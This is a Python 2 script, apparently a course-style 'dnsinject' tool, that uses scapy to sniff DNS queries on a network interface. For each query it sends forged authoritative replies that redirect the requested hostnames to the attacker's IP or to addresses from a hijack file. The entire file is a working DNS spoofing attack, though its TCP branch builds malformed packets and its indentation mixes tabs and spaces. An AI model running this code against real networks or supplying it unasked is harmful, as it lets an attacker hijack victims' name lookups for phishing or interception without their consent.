from scapy.all import *
from netifaces import AF_INET, ifaddresses
import argparse
import netifaces

def dns_spoof(pkt):
        if pkt.haslayer(DNS) and pkt.haslayer(DNSQR) and pkt[DNS].qr == 0:  # DNS question record
            # search for pkt[DNSQR].qname is the domain that the client requested it should be in the host file
            host_name = pkt[DNSQR].qname
            call = False
            if host is None:
                print "filename not entered, using attacker ip as forged response"       
                #print ip, interface                
    		redirect_to = ip
                call = True

            else:
                with open(host) as fp:
                    for line in fp:
                        #print line
                        if host_name.rstrip('.') in line:
                            mylist = line.split(" ")
                            redirect_to = mylist[0]       # the is address of the host3
                            call = True

            if call: 
                if pkt.haslayer(IP) and pkt.haslayer(UDP):
            		spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                          UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                          DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1, \
                          an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=redirect_to))
            		print spoofed_pkt.show()
            		send(spoofed_pkt)
            		print 'Sent packet', spoofed_pkt.summary()
                if pkt.haslayer(IP) and pkt.haslayer(TCP):
               		spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                          TCP(dport=pkt[TCP].sport, sport=pkt[TCP].dport) / \
                          DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1, \
                          an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=redirect_to))
            		print spoofed_pkt.show()
            		send(spoofed_pkt)
            		print 'Sent packet', spoofed_pkt.summary()

def getIpFromInterface(interface):
     ip = netifaces.ifaddresses(interface)[AF_INET][0]['addr']
     print 'interface:'
     print interface
     print 'ip of given interface is:'
     print ip
     return ip
                
def chooseInterface(interfaceList):
   
    for interface in interfaceList:
        #print interface
        #print ifaddresses(interface)
        if "lo" not in interface:
        	for i in ifaddresses(interface).setdefault(AF_INET,[{'addr':'None'}]):
			if i['addr'] is not 'None':
                        	ip = i['addr']
        			chose = interface
        	

    return ip, str(chose)

def argParser():
    parser = argparse.ArgumentParser(add_help = False, description='Process some integers.')
    parser.add_argument("-h", "--file", dest="host",
                  help="a FILE containing ip addresses and host names to be hijacked", metavar="FILE")
    parser.add_argument("-i",
                  help="specifies interface to listen to")
    parser.add_argument('expression', nargs='*', action="store")
    args = parser.parse_args()
    return args.i, args.host, args.expression

if __name__ == '__main__':
    interface, host, expression = argParser()
    if not expression:
    	expression = ''
    if interface:
        interface_flag = 1
        ip = getIpFromInterface(interface)
    else:
        interface_flag = 0
        ip,interface = chooseInterface(netifaces.interfaces())
        print 'default interface:',interface
        print 'IP:',ip
    if host:
        host_flag = 1
    else:
        print 'capturing all traffic'
    if expression:
        expression_flag = 1
    else:
        expression_flag = 0
    try:
        if interface_flag:
            sniff(filter=expression, iface=interface, store=0, prn=dns_spoof)
        else:
            sniff(filter=expression, store=0, prn=dns_spoof)

    except AttributeError:
        print 'Invalid attributes supplied to dns inject',
        print 'correct format is dnsinject [-i interface] [-h hostnames] expression'


